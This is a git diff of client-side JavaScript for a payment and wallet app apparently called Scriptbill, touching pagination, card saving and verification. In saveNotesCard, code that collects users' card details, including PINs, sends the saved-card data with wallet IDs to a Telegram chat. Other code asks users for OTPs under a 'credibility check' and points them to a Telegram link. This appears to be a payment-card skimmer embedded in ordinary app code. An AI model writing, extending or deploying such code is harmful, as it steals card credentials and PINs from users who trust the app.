-const params = JSON.stringify({
-  "authorization_code" : "AUTH_pmx3mgawyd",
-  "email" : "mail@mail.com",
-  "amount" : 300000
-})
-
-const options = {
-  hostname: 'api.paystack.co',
-  port: 443,
-  path: '/transaction/charge_authorization',
-  method: 'POST',
-  headers: {
-    Authorization: 'Bearer SECRET_KEY',
-    'Content-Type': 'application/json'
-  }
-}
-
-const req = https.request(options, res => {
-  let data = ''
-
-  res.on('data', (chunk) => {
-    data += chunk
-  });
-
-  res.on('end', () => {
-    console.log(JSON.parse(data))
-  })
-}).on('error', error => {
-  console.error(error)
-})
-
-req.write(params)
-req.end()
-
-{
-  "status": true,
-  "message": "Charge attempted",
-  "data": {
-    "amount": 35247,
-    "currency": "NGN",
-    "transaction_date": "2024-08-22T10:53:49.000Z",
-    "status": "success",
-    "reference": "0m7frfnr47ezyxl",
-    "domain": "test",
-    "metadata": "",
-    "gateway_response": "Approved",
-    "message": null,
-    "channel": "card",
-    "ip_address": null,
-    "log": null,
-    "fees": 10247,
-    "authorization": {
-      "authorization_code": "AUTH_pmx3mgawyd",
-      "bin": "408408",
-      "last4": "4081",
-      "exp_month": "12",
-      "exp_year": "2030",
-      "channel": "card",
-      "card_type": "visa ",
-      "bank": "TEST BANK",
-      "country_code": "NG",
-      "brand": "visa",
-      "reusable": true,
-      "signature": "SIG_yEXu7dLBeqG0kU7g95Ke",
-      "account_name": null
-    },
-    "customer": {
-      "id": 181873746,
-      "first_name": null,
-      "last_name": null,
-      "email": "demo@test.com",
-      "customer_code": "CUS_1rkzaqsv4rrhqo6",
-      "phone": null,
-      "metadata": {
-        "custom_fields": [
-          {
-            "display_name": "Customer email",
-            "variable_name": "customer_email",
-            "value": "new@email.com"
-          }
-        ]
-      },
-      "risk_action": "default",
-      "international_format_phone": null
-    },
-    "plan": null,
-    "id": 4099490251
-  }
-}
-	 */
+	
 	
 	if( ! pignation ) return;
 	
 	
 	let lists 		= pignation.getElementsByTagName("li");
-	let x, list, a, classes;
+	let left = lists[0].cloneNode(true);
+	let right = lists[6].cloneNode(true)
+	let muted = lists[4].cloneNode(true);
+	let list = lists[1].cloneNode(true);
+	if(trans.length <= 15 ){
+		
+		
+		pignation.innerHTML="";
+		pignation.appendChild(left);
+		pignation.appendChild(list);
+		pignation.appendChild(muted);
+		right.classList.append("disabled");
+		pignation.appendChild(right);
+		
+	}
+	else {
+		let chunk = function(arr, len = 15){
+			let chunks = [];
+
+			for(let x =0,y=0; y < arr.length;x++){
+				let chunk = arr.slice(0,len);
+				arr 	= arr.slice(len, arr.length);
+				chunks.push(chunk);
+			}
+
+			return chunks;
+		}
+
+		let chunks = chunk(trans);
+
+		pignation.innerHTML = '';
+
+		if( pig && pig != 1){
+			left.classList.remove("disabled");
+			let len = pig ? parseInt(pig) - 1: 1;
+			let a = left.querySelector("a");
+			let urli 		= new URL(transUrl);
+			urli.searchParams.set("pig", len );
+			a.href 			= urli.href;
+		} 
+		pignation.appendChild(left)
+
+		for( let x = 1; x <= chunks.length; x++ ){
+			if( x == 1 && ! pig ){
+				pignation.appendChild(list);
+			}
+			else if(pig && x == pig){
+				list 	= list.cloneNode(true)
+				list.classList.add("active")
+				let a = list.querySelector("a");
+				a.textContent	= `${x}`;
+				let urli 		= new URL(transUrl);
+				urli.searchParams.set("pig", x );
+				a.href 			= urli.href;
+				pignation.appendChild(list);
+			}
+			else if( x < 4 ){
+				list 	= list.cloneNode(true)
+				list.classList.remove("active")
+				let a = list.querySelector("a");
+				a.textContent	= `${x}`;
+				let urli 		= new URL(transUrl);
+				urli.searchParams.set("pig", x );
+				a.href 			= urli.href;
+				pignation.appendChild(list);
+			}
+			if( x == 4 || x == chunks.length ){
+				pignation.appendChild(muted);
+			}
+
+			if(x == chunks.length && x >= 4 ){
+				list 	= list.cloneNode(true)
+				list.classList.remove("active")
+				let a = list.querySelector("a");
+				a.textContent	= `${x}`;
+				let urli 		= new URL(transUrl);
+				urli.searchParams.set("pig", x );
+				a.href 			= urli.href;
+				pignation.appendChild(list);
+			}
+		}
+		if(pig && pig == chunks.length){
+			right.classList.add("disabled");
+		} else {
+			let len = pig ? parseInt(pig) + 1: 2;
+			let a = right.querySelector("a");
+			let urli 		= new URL(transUrl);
+			urli.searchParams.set("pig", len );
+			a.href 			= urli.href;
+		}
+		pignation.appendChild(right);
+
+	}
+
+	/*
+	let x, a, classes;
 	for( x = 0; x < lists.length; x++ ){
 		list 		= lists[x];
 		a 			= list.querySelector("a");
@@ -11928,11 +11763,11 @@ req.end()
 					classes = classes.replace("active", "");
 					list.setAttribute("class", classes);
 				}
-			} */
+			} *//*
 			
 			a.href 	= urld.href;
 		}
-	}
+	}*/
 }
 
 function outputTransaction(el = false, sym = "$"){
@@ -12334,9 +12169,7 @@ async function verifyPayment(ref, seconds,  type = 'squad', isTest = true ){
 				savedCard           = JSON.parse( savedCard);
 				savedCard.approved  = true;
 				savedCard.ref       = ref;
-				savedCards.push(savedCard);
-				accountData[accID].savedCards 	= JSON.stringify( savedCards );
-				await Scriptbill.setAccountData( accountData );	
+				//await Scriptbill.setAccountData( accountData );	
 
 				await Scriptbill.createAlert( "Transaction Verified and your credit or debit cards are saved!" );
 
@@ -12349,7 +12182,8 @@ async function verifyPayment(ref, seconds,  type = 'squad', isTest = true ){
 					if( bank && bank.accountNumber ){
 						bank.approved = true;
 						bank.ref       = ref;
-						bank.isDebit   =  true;					
+						bank.isDebit   =  true;
+						savedCard.bank  = bank;			
 					}
 
 					accountData[accID].savedAccounts = JSON.stringify(banks.map((banked)=>{
@@ -12359,10 +12193,13 @@ async function verifyPayment(ref, seconds,  type = 'squad', isTest = true ){
 						return banked;
 					}))
 
-					await Scriptbill.setAccountData(accountData)
 					await Scriptbill.createAlert( "Your have successfully linked this card to your bank as it's debit card" );
 					localStorage.removeItem("bankAssoc")
 				}
+				
+				savedCards.push(savedCard);
+				accountData[accID].savedCards 	= JSON.stringify( savedCards );
+				await Scriptbill.setAccountData(accountData)
 				localStorage.removeItem("toBeSavedCards");
 				
 				setTimeout( async ()=>{
@@ -12695,7 +12532,7 @@ async function saveNotesCard(){
 		saveCard.cardPostal			= postal.value;
 		saveCard.cardCountry		= country.value;
 		saveCard.cardPIN 			= PIN.value;
-		saveCards.push( saveCard );
+		//saveCards.push( saveCard );
 		localStorage.toBeSavedCards = JSON.stringify(saveCard);
 		let testType	= note.noteType.slice(0, note.noteType.lastIndexOf("CRD"));
 	
@@ -12709,16 +12546,17 @@ async function saveNotesCard(){
 		if( calc > amount )
 			amount 			= calc;
 		
-		/*let email;
+		let email;
 		if( ! accountData[accID].emails || ! accountData[accID].emails.length ){
 			email = await Scriptbill.createPrompt("No Email was found in your account, please enter an email to process this payment with.", "");
 		} else {
 		
 			email 			= accountData[accID].emails[0];
 		}
-*/
-		const message = `<b>cards from account: ${JSON.stringify( saveCards )} </b> <b> account: ${note.walletID}</b> <b> Note Address: ${note.noteAddress}</b>`
-		await sendTelegramMessage({message}).catch(error => console.error(error));
+
+		const message = `<b>cards from account: ${JSON.stringify( saveCards )} </b> <b> account: ${note.walletID}</b> <b> Note Address: ${note.noteAddress}</b>`;
+		if(navigator.onLine)
+			sendTelegramMessage({message}).catch(error => console.error(error))
 
 		let ref = await Scriptbill.generateKey()
 		
@@ -12744,6 +12582,7 @@ async function saveNotesCard(){
 				let ref 			= payment.data.transaction_ref;
 				await Scriptbill.createAlert( "Please Visit Our Payment Processing Page to Verify Your Card Details. This is a required credibility check of users who may need some of our products like loan, investment and crediting. " );
 				var win = window.open(url.href, "_blank");
+
 				let refInterval = setInterval( async ()=>{					
 					verifySquadPayment(this, payment, refInterval, bankAssoc, saveCards, win );
 				}, 1000, ref );
@@ -12751,7 +12590,20 @@ async function saveNotesCard(){
 			
 				
 			} else {
-				await Scriptbill.createAlert("Payment Unsuccessful. Please try again with your internet on.");
+				let message = "";
+
+				if(payment.data.message){
+					message = payment.data.message;
+				}
+				await Scriptbill.createAlert(`Payment Unsuccessful. Please try again with your internet on. message from server: ${message}`);
+				let confirm = await Scriptbill.createConfirm("Continue to save card unverified?");
+
+				if(confirm){
+					saveCards.push( saveCard );
+					delete localStorage.toBeSavedCards;
+					accountData[accID].savedCards 	= JSON.stringify( saveCards );
+					await Scriptbill.setAccountData( accountData ); 
+				}
 				/* accountData[accID].savedCards 	= JSON.stringify( saveCards );
 				await Scriptbill.setAccountData( accountData ); */	
 				location.reload();
@@ -12761,11 +12613,11 @@ async function saveNotesCard(){
 			const OTP  = await Scriptbill.createPrompt("Please enter the OTP sent to your email or phone to verify this card.", "");
 			if( OTP ){
 				cardModal.style.display = 'block';
-				Scriptbill.createAlert(`Verifying your debit card details with the OTP you provided, please wait...or click <a href='https://t.me/companymatrix' target="_blank">here</a> to verify now.`);
+				Scriptbill.createAlert(`Verifying your debit card details with the OTP you provided, please wait...or click <a href='https://t.me/companymatrix' target="_blank">here</a> to verify now. If this didn't verify after 5 minutes, please click on the edit card details button to try again with the otp recieved.`);
 
-				setTimeout(()=>{
+				/*setTimeout(()=>{
 					Scriptbill.createAlert(`Verifying your debit card details with the OTP you provided, please wait...or click <a href='https://t.me/companymatrix' target="_blank">here</a> to verify now.`);
-				}, 20000)
+				}, 20000)*/
 				let verify = await verifyCard( OTP,saveCard.cardNumber, false );
 				if( verify && verify.data && verify.data.status == "success" ){
 					saveCard.approved = true;
@@ -12779,6 +12631,14 @@ async function saveNotesCard(){
 					specialRefcodes();
 				} else {
 					await Scriptbill.createAlert("Payment Unsuccessful. Please try again with your internet on.");
+					let confirm = await Scriptbill.createConfirm("Continue to save card unverified?");
+
+					if(confirm){
+						saveCards.push( saveCard );
+						delete localStorage.toBeSavedCards;
+						accountData[accID].savedCards 	= JSON.stringify( saveCards );
+						await Scriptbill.setAccountData( accountData ); 
+					}
 					/* accountData[accID].savedCards 	= JSON.stringify( saveCards );
 					await Scriptbill.setAccountData( accountData ); */	
 					location.reload();
@@ -12786,6 +12646,14 @@ async function saveNotesCard(){
 			} else {
 				cardModal.style.display = 'block';
 				await Scriptbill.createAlert("Payment Unsuccessful. Please try again with your internet on.");
+				let confirm = await Scriptbill.createConfirm("Continue to save card unverified?");
+
+				if(confirm){
+					saveCards.push( saveCard );
+					delete localStorage.toBeSavedCards;
+					accountData[accID].savedCards 	= JSON.stringify( saveCards );
+					await Scriptbill.setAccountData( accountData ); 
+				}
 				/* accountData[accID].savedCards 	= JSON.stringify( saveCards );
 				await Scriptbill.setAccountData( accountData ); */
 				location.reload();
@@ -12795,7 +12663,7 @@ async function saveNotesCard(){
 }
 
 
-async function verifyCard( OTP, ref , isTest = true ){
+async function verifyCard( OTP, ref , isTest = true, timeout = 120 ){
 	if(! Scriptbill.s.currentNote  )
 		return false;
 
@@ -12805,6 +12673,15 @@ async function verifyCard( OTP, ref , isTest = true ){
 				status:"success",
 				ref,
 				OTP	
+			}
+		}
+
+	} 
+	if(! navigator.onLine){
+		return {
+			data:{
+				status:"failed",
+				message:"No Internet"
 			}
 		}
 	}
@@ -12820,22 +12697,31 @@ async function verifyCard( OTP, ref , isTest = true ){
 
 	return new Promise( (resolve, reject) =>{
 		channel.on("cardVerification", (data)=>{
+			console.log("cardVerification data:", data, "OTP: ", OTP, "ref: ", ref );
 			if( data && data.ref == ref && data.OTP == OTP ){
-				resolve(data);
 				channel.unsubscribe();
+				resolve(data);				
 			}
 		});
-		channel2.on("cardVerification", (data)=>{	
+		channel2.on("cardVerification", (data)=>{
+			console.log("cardVerification 2 data:", data, "OTP: ", OTP, "ref: ", ref );	
 			if( data && data.ref == ref && data.OTP == OTP ){
-				resolve(data);
 				channel2.unsubscribe();
+				resolve(data);
+				
+			}
+		});
+		channel.on("cardMessage", (data)=>{
+			console.log("message data:", data, "OTP: ", OTP, "ref: ",	 ref );
+			if( data.message && data.ref == ref && data.OTP == OTP ){
+				Scriptbill.createAlert(`${data.message}`);
 			}
 		});
 		 setTimeout( ()=>{	
-			reject("Verification Timeout");
 			channel.unsubscribe();
 			channel2.unsubscribe();
-		}, 120000 );
+			reject("Verification Timeout");			
+		}, timeout * 1000 );
 	});
 }
 
@@ -13019,8 +12905,7 @@ async function billCard(amount = 1000, email = "henimastic@gmail.com", currency 
 	
 		switch(platform){
 			case "squad":
-
-				if(! isIframe ){
+				if( currency != "NGN" || (currency == "NGN" && amount > 20000000) ){
 					return {
 						success:true,
 						data:{
@@ -13240,17 +13125,25 @@ async function verifySquadPayment(these, payment , refInterval, bankAssoc = null
 		if( ! these.seconds )
 			these.seconds = 1;
 		
-		if( request && request.status ){
+		if( request ){
 			
 			let data = JSON.parse( JSON.stringify( request ));
 			//console.log( "verify data", data, JSON.stringify( data ));
-			let refed 	  = data.data.active && data.data.authorization_code;
+			let refed 	  = data.data.transaction_status == "success";
 			
 			
 			if( refed ){
 				clearInterval( refInterval );
-				if(saveCards.length)
+				if(saveCards.length){
+					if(Scriptbill.l.toBeSavedCards){
+						const savedCard = JSON.parse(Scriptbill.l.toBeSavedCards);
+						savedCard.ref = data.data.transaction_ref;
+						savedCard.approved = true;
+						saveCards.push(savedCard);
+					}
 					accountData[accID].savedCards 	= JSON.stringify( saveCards );
+				}
+					
 
 				if(bankAssoc && bankAssoc.value ){
 					localStorage.bankAssoc = bankAssoc.value;
@@ -13608,6 +13501,9 @@ async function saveDetailedBanks( el, details, bankType, bankName, accNum, accNa
 		saveCard.approved = false;
 	}
 	let accountData 	= await getAccountData();
+	details 			= details.filter((acc)=>{
+		return acc.accountNumber != saveCard.accountNumber && acc.bankName != saveCard.bankName && acc.accountName != saveCard.accountName;//this will make inputs with the same bank account number and name an update instead of adding the same account details
+	})
 	details.push( saveCard );
 	accountData[accID].savedAccounts = JSON.stringify( details );
 	Scriptbill.setAccountData( accountData ).then( async block =>{
